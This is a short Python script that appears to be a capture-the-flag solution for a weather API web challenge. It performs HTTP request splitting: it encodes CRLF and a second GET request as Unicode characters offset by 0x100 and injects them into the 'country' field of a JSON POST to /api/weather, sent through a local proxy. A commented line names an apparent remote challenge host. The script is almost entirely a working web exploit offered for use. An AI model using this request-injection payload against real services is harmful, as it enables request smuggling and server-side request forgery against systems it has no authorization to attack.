#!/usr/bin/env python3

import requests

proxy_conf = {
    "http":"http://127.0.0.1:8080"
}

def smuggle(data: str):
    output = ""
    
    for d in data:
        c = ord(d)
        if (c < 0x21 or c > 0x7F):
            c = 0x0100 | c

        output += chr(c)

    return output

def main()-> None:

    mal_request = "\r\n"
    mal_request += "GET / HTTP/1.1\r\n"
    mal_request += "Host: 127.0.0.1:8000"
    #mal_request += "Host: 157.245.37.125:30939\r\n"
    mal_request += "\r\n"
    mal_request = smuggle(mal_request).encode("utf-8")

    payload = {
        "endpoint":"api.openweathermap.org",
        "city":"Raleigh",
        "country":b"US" + mal_request
    }

    r = requests.post("http://127.0.0.1:1337/api/weather", json=payload, proxies=proxy_conf)
    print(r.text)

    return

if __name__ == "__main__":
    main()